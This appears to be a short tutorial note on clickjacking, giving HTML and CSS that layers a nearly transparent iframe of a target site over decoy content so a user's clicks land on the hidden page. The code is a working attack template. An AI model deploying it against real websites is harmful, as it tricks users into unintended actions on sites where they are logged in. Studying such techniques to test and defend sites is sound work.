
### Notes on Using CSS and HTML to Overlay a Decoy on a Target Website (Clickjacking)

This example demonstrates how to create a decoy overlay that sits on top of a transparent iframe, effectively setting up a **clickjacking** scenario:

```html
<head>
  <style>
    /* Style for the target iframe */
    #target_website {
      position: relative;     /* Positioned relative to parent container */
      width: 128px;           /* Small size for the hidden iframe */
      height: 128px;
      opacity: 0.00001;       /* Almost invisible to the user */
      z-index: 2;             /* Above the decoy content */
    }

    /* Style for the decoy content */
    #decoy_website {
      position: absolute;     /* Positioned absolutely over the target iframe */
      width: 300px;           /* Size of the decoy content */
      height: 400px;
      z-index: 1;             /* Below the target iframe */
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <!-- Decoy content that appears to the user -->
    ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```



